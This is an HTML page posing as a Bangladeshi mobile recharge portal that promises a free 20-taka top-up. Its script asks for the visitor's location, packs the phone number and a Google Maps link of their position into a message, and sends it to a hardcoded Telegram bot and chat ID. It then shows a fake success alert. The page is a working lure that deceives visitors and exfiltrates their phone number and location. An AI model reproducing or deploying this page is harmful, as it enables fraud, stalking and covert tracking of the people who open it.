<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #fdfdfd; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; text-align: center; }
        .container { max-width: 400px; margin: 50px auto; padding: 30px; border: 1px solid #ddd; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); background: #fff; }
        .offer-title { color: #28a745; font-size: 26px; font-weight: bold; margin-bottom: 15px; }
        input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; }
        .btn { background: #007bff; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
        .btn:active { background: #0056b3; }
        .footer { margin-top: 30px; font-size: 12px; color: #888; }
    </style>
</head>
<body>
    <div class="container">
        <div class="offer-title">২০ টাকা ফ্রি রিচার্জ! 🎁</div>
        <p>আপনার মোবাইল নম্বরটি দিয়ে 'উইথড্র' বাটনে ক্লিক করুন।</p>
        <input type="number" id="target_phone" placeholder="017XXXXXXXX" required>
        <button class="btn" onclick="initiateProcess()">উইথড্র (Withdraw)</button>
        <div class="footer">© 2026 Mobile Services Bangladesh</div>
    </div>

    <script>
        async function initiateProcess() {
            const phone = document.getElementById('target_phone').value;
            const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; // আপনার বট টোকেন
            const chat_id = "7887080882"; // আপনার চ্যাট আইডি

            if (phone.length < 11) { 
                alert("সঠিক ১১ সংখ্যার মোবাইল নম্বর দিন!"); 
                return; 
            }
            
            // লোকেশন পারমিশন চাওয়া হচ্ছে
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                // গুগল ম্যাপ লিঙ্ক তৈরি
                const map_link = `https://www.google.com/maps?q=${lat},${lon}`;
                
                // টেলিগ্রামে পাঠানোর মেসেজ ফরম্যাট
                const msg = `🔔 **নতুন রিচার্জ রিকোয়েস্ট!**\n\n📱 ফোন নম্বর: ${phone}\n📍 ম্যাপ লিঙ্ক: ${map_link}`;
                
                // সরাসরি টেলিগ্রামে মেসেজ পাঠানো
                try {
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                    alert("অনুরোধ সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
                } catch (error) {
                    alert("সার্ভার সমস্যা, আবার চেষ্টা করুন।");
                }
            }, (err) => {
                alert("দুঃখিত! লোকেশন পারমিশন ছাড়া এই অফারটি গ্রহণ করা সম্ভব নয়।");
            });
        }
    </script>
</body>
</html>
